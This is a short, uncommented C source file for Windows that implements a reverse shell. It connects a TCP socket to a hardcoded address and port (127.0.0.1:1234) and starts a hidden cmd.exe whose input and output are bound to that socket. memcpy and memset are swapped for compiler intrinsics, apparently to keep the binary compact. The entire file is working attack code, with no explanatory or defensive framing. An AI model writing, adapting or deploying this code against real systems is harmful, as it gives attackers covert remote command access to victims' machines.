
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_ 
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#define memcpy(x,y,z) __movsb(x,y,z)
#define memset(x,y,z) __stosb(x,y,z)

#define HTONS(x) ((((WORD)(x) & 0xff00) >> 8) | (((WORD)(x) & 0x00ff) << 8))

void main(void)
{
  PROCESS_INFORMATION pi;
  STARTUPINFO         si;
  WSADATA             wsa;
  SOCKET              s;
  struct sockaddr_in  sa;
  u_long              ip=0x0100007F;
    
  WSAStartup(2, &wsa);
  s=WSASocket(AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);

  sa.sin_family = AF_INET;
  sa.sin_port   = HTONS(1234);
  memcpy ((void*)&sa.sin_addr, (void*)&ip, sizeof(ip));
    
  connect(s, (struct sockaddr*)&sa, sizeof(sa));

  memset ((void*)&si, 0, sizeof(si));

  si.cb         = sizeof(si);
  si.dwFlags    = STARTF_USESTDHANDLES;
  si.hStdInput  = (HANDLE)s;
  si.hStdOutput = (HANDLE)s;
  si.hStdError  = (HANDLE)s;

  CreateProcess (NULL, "cmd", NULL, NULL, 
    TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

  WaitForSingleObject (pi.hProcess, INFINITE);
}
